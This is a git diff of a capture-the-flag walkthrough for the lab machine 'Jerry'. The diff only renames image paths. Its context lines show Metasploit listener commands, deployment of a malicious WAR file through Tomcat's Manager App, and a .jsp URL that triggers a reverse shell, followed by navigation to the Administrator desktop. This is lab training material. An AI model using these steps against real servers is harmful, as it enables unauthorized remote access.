@@ -69,15 +69,15 @@ msf6 > set LPORT 9001
 msf6 > exploit -j
 ```
 
-<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Deploy the war file in the `Manager App`.
 
-<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Unzip the folder in your directory, and grab the file ending in `.jsp`. Add the name of this file to the end of the URL in your web browser. This will execute your war file, and the reverse shell listening on your machine should catch the connection.
 
-<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ```shell
 10.10.10.95:8080/tomcat1/dnawdram.jsp
@@ -85,7 +85,7 @@ Unzip the folder in your directory, and grab the file ending in `.jsp`. Add the 
 
 Go back to the `Metasploit` listener and check if a session has started.&#x20;
 
-<figure><img src="../../.gitbook/assets/image (5) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (5) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 You can run the following commands to find the flag:
 
@@ -97,7 +97,7 @@ cd Administrator
 cd Desktop
 ```
 
-<figure><img src="../../.gitbook/assets/image (6) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (6) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Congrats! You have successfully completed Jerry.&#x20;
 
